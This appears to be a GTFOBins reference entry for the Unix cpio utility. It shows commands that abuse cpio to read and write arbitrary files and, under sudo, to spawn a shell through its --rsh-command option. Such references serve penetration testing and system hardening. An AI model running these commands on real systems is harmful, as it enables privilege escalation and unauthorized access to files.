---
type: gtfobin
name: cpio
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# cpio

## file-read

```bash
echo /path/to/input-file | cpio -o
```
_The content of the file is printed to standard output, between the `cpio` archive format header and footer._
**Contexts:** sudo, suid, unprivileged

```bash
echo /path/to/input-file | cpio -dp .
cat path/to/input-file
```
_The whole directory structure is copied to `.`, hence this is also a file write._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -udp .
```
_The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```
**Contexts:** sudo
